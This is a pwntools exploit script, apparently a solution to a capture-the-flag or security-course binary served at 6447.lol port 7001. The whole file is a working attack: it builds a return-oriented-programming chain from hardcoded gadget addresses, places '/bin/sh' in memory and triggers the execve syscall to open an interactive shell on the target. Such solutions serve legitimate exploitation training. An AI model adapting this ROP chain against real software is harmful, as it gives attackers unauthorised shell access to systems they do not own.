#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 7001

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

POP_RAX = p64(0x004213eb)
POP_RDI = p64(0x0047e852)
POP_RSI = p64(0x0047d04b)
JUNK = p64(0x0)
SYSCALL = p64(0x0040b9f6) # syscall; ret;
MOV_RDI_RAX = p64(0x00404bd6) # mov rdi, rax; cmp rdx, rcx; jae 0x4bc0; mov rax, rsi; ret; 

def exploit():
    offset = 8 # found using cyclic
    rop_chain = b"/bin/sh\x00"            # "/bin/sh" string in rax
    rop_chain += b"A" * offset
    rop_chain += POP_RSI                  # pop rsi; ret;
    rop_chain += JUNK                     # Address with 0 value in memory
    rop_chain += MOV_RDI_RAX
    rop_chain += POP_RAX                  # pop rax; ret;
    rop_chain += p64(0x3b)                # rax = 0x3b (execve syscall)
    rop_chain += SYSCALL

    P.sendlineafter(b"most...\n", rop_chain)

    P.interactive()


if __name__ == '__main__':
    connect_binary()
    exploit()
